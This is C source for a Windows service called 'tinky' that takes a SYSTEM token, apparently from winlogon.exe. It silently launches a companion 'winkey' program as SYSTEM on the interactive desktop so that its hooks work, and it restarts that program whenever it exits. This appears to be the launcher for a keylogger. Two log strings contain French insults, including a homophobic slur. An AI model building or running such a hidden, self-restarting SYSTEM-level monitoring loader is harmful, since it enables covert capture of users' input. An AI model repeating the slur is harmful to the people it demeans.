#define _UNICODE
#include <windows.h>
#include <winsvc.h>
#include <stdio.h>
#include <wchar.h>
#include "cli.h"
#include "token.h"  // <-- déclare GetSystemImpersonationToken()

#define SERVICE_NAME L"tinky"

static SERVICE_STATUS_HANDLE gStatusHandle = NULL;
static SERVICE_STATUS gStatus = {0};
static DWORD gCheckpoint = 0;
static HANDLE gStopEvent = NULL;
static HANDLE gSystemToken = NULL;
static HANDLE gChildProc = NULL;

#include <shlobj.h>

static void AppendLog(const wchar_t* fmt, ...)
{
    CreateDirectoryW(L"C:\\Temp", NULL); // au cas où
    HANDLE h = CreateFileW(L"C:\\Temp\\svc_trace.log",
                           FILE_APPEND_DATA, FILE_SHARE_READ|FILE_SHARE_WRITE,
                           NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;

    wchar_t line[1024];
    va_list ap; va_start(ap, fmt);
    _vsnwprintf_s(line, _countof(line), _TRUNCATE, fmt, ap);
    va_end(ap);

    // ajout d’un \r\n
    wchar_t out[1100];
    _snwprintf_s(out, _countof(out), _TRUNCATE, L"%s\r\n", line);

    DWORD bytes = 0;
    WriteFile(h, out, (DWORD)(lstrlenW(out) * sizeof(wchar_t)), &bytes, NULL);
    CloseHandle(h);
}

static void LogWinErr(const wchar_t* where)
{
    DWORD e = GetLastError();
    wchar_t msg[512];
    FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM|FORMAT_MESSAGE_IGNORE_INSERTS,
                   NULL, e, 0, msg, _countof(msg), NULL);
    AppendLog(L"[ERR] %s failed (%lu): %s", where, e, msg);
}

static void LogLastErr(const wchar_t* where) {
    DWORD e = GetLastError();
    wchar_t buf[512];
    FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                   NULL, e, 0, buf, (DWORD)(sizeof buf / sizeof *buf), NULL);
    fwprintf(stderr, L"[svc] %s failed (%lu): %s\n", where, e, buf);
}
// Lance un EXE console sans fenêtre visible, redirige stdout/stderr vers un .log
// Retourne TRUE si OK et, si outProc!=NULL, renvoie le handle process (à fermer plus tard)
static BOOL RunHiddenConsole(LPCWSTR exePath, LPCWSTR args, LPCWSTR logPath, HANDLE* outProc)
{
    AppendLog(L"--- RunHiddenConsole start ---");
    AppendLog(L"exePath='%s'", exePath ? exePath : L"(null)");
    AppendLog(L"args   ='%s'", args ? args : L"(none)");

    if (!exePath || !*exePath) { AppendLog(L"[ERR] exePath empty"); return FALSE; }

    // 1) Vérif du fichier exe
    DWORD attr = GetFileAttributesW(exePath);
    if (attr == INVALID_FILE_ATTRIBUTES || (attr & FILE_ATTRIBUTE_DIRECTORY)) {
        AppendLog(L"[ERR] exe introuvable ou est un répertoire");
        return FALSE;
    }

    // 2) Construire cmdline correctement quotée : "C:\...\main.exe" [args]
    wchar_t cmd[1024];
    if (args && *args) _snwprintf_s(cmd, _countof(cmd), _TRUNCATE, L"\"%s\" %s", exePath, args);
    else               _snwprintf_s(cmd, _countof(cmd), _TRUNCATE, L"\"%s\"",   exePath);
    AppendLog(L"cmdline='%s'", cmd);

    // 3) Répertoire de travail = dossier de l’exe
    wchar_t workdir[MAX_PATH];
    wcsncpy_s(workdir, _countof(workdir), exePath, _TRUNCATE);
    wchar_t* last = wcsrchr(workdir, L'\\');
    if (last) *last = L'\0';
    AppendLog(L"workdir='%s'", workdir);

    // 4) Préparer handles STD*
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE }; // héritables
    CreateDirectoryW(L"C:\\Temp", NULL);
    LPCWSTR logFile = (logPath && *logPath) ? logPath : L"C:\\Temp\\child_output.log";
    HANDLE hLog = CreateFileW(logFile, GENERIC_WRITE, FILE_SHARE_READ,
                              &sa, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hLog == INVALID_HANDLE_VALUE) { LogWinErr(L"CreateFile(log)"); return FALSE; }
    AppendLog(L"stdout/stderr -> %s", logFile);

    HANDLE hNullIn = CreateFileW(L"NUL", GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
                                 &sa, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hNullIn == INVALID_HANDLE_VALUE) { CloseHandle(hLog); LogWinErr(L"CreateFile(NUL)"); return FALSE; }

    STARTUPINFOW si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput  = hNullIn;
    si.hStdOutput = hLog;
    si.hStdError  = hLog;

    PROCESS_INFORMATION pi = {0};

    // 5) CreateProcess
    DWORD flags = CREATE_NO_WINDOW; // console non visible, mais STD* valides
    AppendLog(L"CreateProcessW...");
    BOOL ok = CreateProcessW(
        exePath,   // lpApplicationName (chemin complet)
        cmd,       // lpCommandLine
        NULL, NULL,
        TRUE,      // bInheritHandles -> indispensable pour STD*
        flags,
        NULL,
        workdir,
        &si, &pi
    );

    // Les handles parents peuvent être fermés après CreateProcess
    CloseHandle(hNullIn);
    CloseHandle(hLog);

    if (!ok) {
        LogWinErr(L"CreateProcessW");
        AppendLog(L"--- RunHiddenConsole end (FAIL) ---");
        return FALSE;
    }

    // 6) Diagnostic immédiat
    DWORD code = 0;
    if (GetExitCodeProcess(pi.hProcess, &code)) {
        if (code == STILL_ACTIVE) {
            AppendLog(L"[OK] child lancé, PID=%lu", (unsigned long)pi.dwProcessId);
        } else {
            AppendLog(L"[WARN] child a quitté immédiatement. ExitCode=%lu", code);
        }
    }

    if (outProc) *outProc = pi.hProcess; else CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    AppendLog(L"--- RunHiddenConsole end (OK) ---");
    return TRUE;
}

static void SetState(DWORD state, DWORD waitHintMs)
{
    gStatus.dwServiceType             = SERVICE_WIN32_OWN_PROCESS;
    gStatus.dwCurrentState            = state;
    gStatus.dwWin32ExitCode           = NO_ERROR;
    gStatus.dwServiceSpecificExitCode = 0;

    switch (state) {
    case SERVICE_START_PENDING:
    case SERVICE_STOP_PENDING:
        gStatus.dwControlsAccepted = 0;
        gStatus.dwCheckPoint = ++gCheckpoint;
        gStatus.dwWaitHint  = waitHintMs;
        break;
    case SERVICE_RUNNING:
        gStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
        gStatus.dwCheckPoint = 0;
        gStatus.dwWaitHint  = 0;
        break;
    case SERVICE_STOPPED:
    default:
        gStatus.dwControlsAccepted = 0;
        gStatus.dwCheckPoint = 0;
        gStatus.dwWaitHint  = 0;
        break;
    }

    SetServiceStatus(gStatusHandle, &gStatus);
}

static VOID WINAPI CtrlHandler(DWORD ctrl)
{
    if (ctrl == SERVICE_CONTROL_STOP && gStopEvent) {
        SetState(SERVICE_STOP_PENDING, 3000);
        SetEvent(gStopEvent);
    }
}

// Lance winkey avec le token système mais dans le desktop interactif
static BOOL RunWinkeyAsSystem(HANDLE hSystemToken, HANDLE* outProc)
{
    AppendLog(L"--- RunWinkeyAsSystem start ---");
    
    if (!hSystemToken) {
        AppendLog(L"[ERR] Token système requis");
        return FALSE;
    }

    // Construire la ligne de commande
    wchar_t cmd[1024];
    _snwprintf_s(cmd, _countof(cmd), _TRUNCATE, 
                 L"\"%s\"", L"C:\\Users\\meter\\Code\\tinky-winkey\\winkey\\main.exe");
    AppendLog(L"cmdline='%s'", cmd);

    // Répertoire de travail
    wchar_t workdir[] = L"C:\\Users\\meter\\Code\\tinky-winkey\\winkey";
    AppendLog(L"workdir='%s'", workdir);

    // Préparer les handles de redirection
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    CreateDirectoryW(L"C:\\Temp", NULL);
    HANDLE hLog = CreateFileW(L"C:\\Temp\\winkey.log", GENERIC_WRITE, FILE_SHARE_READ,
                              &sa, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hLog == INVALID_HANDLE_VALUE) {
        LogWinErr(L"CreateFile(log)");
        return FALSE;
    }

    HANDLE hNullIn = CreateFileW(L"NUL", GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
                                 &sa, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hNullIn == INVALID_HANDLE_VALUE) {
        CloseHandle(hLog);
        LogWinErr(L"CreateFile(NUL)");
        return FALSE;
    }

    STARTUPINFOW si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput  = hNullIn;
    si.hStdOutput = hLog;
    si.hStdError  = hLog;
    // CRITIQUE : spécifier le desktop interactif pour que les hooks fonctionnent
    si.lpDesktop = L"winsta0\\default";

    PROCESS_INFORMATION pi = {0};
    
    // Créer le processus avec le token système mais sur le desktop interactif
    BOOL ok = CreateProcessAsUserW(
        hSystemToken,  // Token système (winlogon.exe)
        NULL,          // Application name (dans cmdline)
        cmd,           // Ligne de commande
        NULL, NULL,    // Security attributes
        TRUE,          // Inherit handles
        CREATE_NO_WINDOW, // Pas de fenêtre console visible
        NULL,          // Environment
        workdir,       // Working directory
        &si, &pi
    );

    // Fermer les handles de redirection
    CloseHandle(hNullIn);
    CloseHandle(hLog);

    if (!ok) {
        LogWinErr(L"CreateProcessAsUserW");
        AppendLog(L"--- RunWinkeyAsSystem end (FAIL) ---");
        return FALSE;
    }

    // Diagnostic
    DWORD code = 0;
    if (GetExitCodeProcess(pi.hProcess, &code)) {
        if (code == STILL_ACTIVE) {
            AppendLog(L"[OK] winkey lancé avec token système, PID=%lu", (unsigned long)pi.dwProcessId);
        } else {
            AppendLog(L"[WARN] winkey a quitté immédiatement. ExitCode=%lu", code);
        }
    }

    if (outProc) *outProc = pi.hProcess; else CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    AppendLog(L"--- RunWinkeyAsSystem end (OK) ---");
    return TRUE;
}

static DWORD WINAPI Worker(LPVOID lpParam)
{
    HANDLE hTok = (HANDLE)lpParam;
    BOOL didImpersonate = FALSE;

    if (hTok) {
        didImpersonate = ImpersonateLoggedOnUser(hTok);
        AppendLog(L"Impersonation avec token système: %s", didImpersonate ? L"OK" : L"ECHEC");
    }
    
    // Lancer winkey avec le token système mais sur le desktop interactif
    RunWinkeyAsSystem(hTok, &gChildProc);

    AppendLog(L"nique les pd qui parle en scred\n\n");
    while (WaitForSingleObject(gStopEvent, 2000) == WAIT_TIMEOUT) {
        // ... ton travail périodique ...
        // (optionnel) surveiller le child :
        if (gChildProc) {
            AppendLog(L"si le savoir est une arme et ben ntm\n\n");
            DWORD code = 0;
            if (GetExitCodeProcess(gChildProc, &code) && code != STILL_ACTIVE) {
                // relancer winkey avec le token système :
                RunWinkeyAsSystem(hTok, &gChildProc);
            }
        }
    }

    // À l'arrêt du service : terminaison "hard" si nécessaire
    if (gChildProc) {
        TerminateProcess(gChildProc, 0);
        WaitForSingleObject(gChildProc, 3000);
        CloseHandle(gChildProc);
        gChildProc = NULL;
    }

    if (didImpersonate) RevertToSelf();
    if (hTok) CloseHandle(hTok); // le thread possède maintenant le handle

    return 0;
}

static VOID WINAPI ServiceMain(DWORD argc, LPWSTR *argv)
{
    (void)argc; (void)argv;

    gStatusHandle = RegisterServiceCtrlHandlerW(SERVICE_NAME, CtrlHandler);
    if (!gStatusHandle) return;

    SetState(SERVICE_START_PENDING, 5000);
    
    gStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!gStopEvent) {
        gStatus.dwWin32ExitCode = GetLastError();
        SetState(SERVICE_STOPPED, 0);
        return;
    }
    gSystemToken = NULL;
    if (!GetSystemImpersonationToken(&gSystemToken)) {
        printf("Error with the impersonation Token ");
    }

    
    SetState(SERVICE_RUNNING, 0);

    HANDLE th = CreateThread(NULL, 0, Worker, gSystemToken, 0, NULL);
    if (th) {
        gSystemToken = NULL;
        WaitForSingleObject(th, INFINITE);
        CloseHandle(th);
    }
    
    if (gSystemToken) { 
        CloseHandle(gSystemToken); 
        gSystemToken = NULL; 
    }
    CloseHandle(gStopEvent);
    gStopEvent = NULL;

    gStatus.dwWin32ExitCode = NO_ERROR;
    SetState(SERVICE_STOPPED, 0);
}

int wmain(int argc, wchar_t** argv)
{
    if (argc > 1) {
        if (_wcsicmp(argv[1], L"install") == 0) return svc_install();
        if (_wcsicmp(argv[1], L"start")   == 0) return svc_start();
        if (_wcsicmp(argv[1], L"stop")    == 0) return svc_stop();
        if (_wcsicmp(argv[1], L"delete")  == 0) return svc_delete();
        if (_wcsicmp(argv[1], L"status")  == 0) return svc_status();

        fwprintf(stderr, L"Usage: %s [install|start|stop|delete|status]\n", argv[0]);
        return 2;
    }
         SERVICE_TABLE_ENTRYW table[] = {
        { (LPWSTR)SERVICE_NAME, ServiceMain },
        { NULL, NULL }
    };
    if (!StartServiceCtrlDispatcherW(table)) {
        // Si lancé *hors* SCM sans argument, on peut afficher une aide
        PrintLastError(L"StartServiceCtrlDispatcherW");
        fwprintf(stderr, L"Tip: run with one of: install | start | stop | delete | status\n");
        return 1;
    }
    return 0;
}
//cl /w4 /EHSC /DUNICODE /D_unicode main.c cli.c /llink advapi32.lib /FE:svc.exe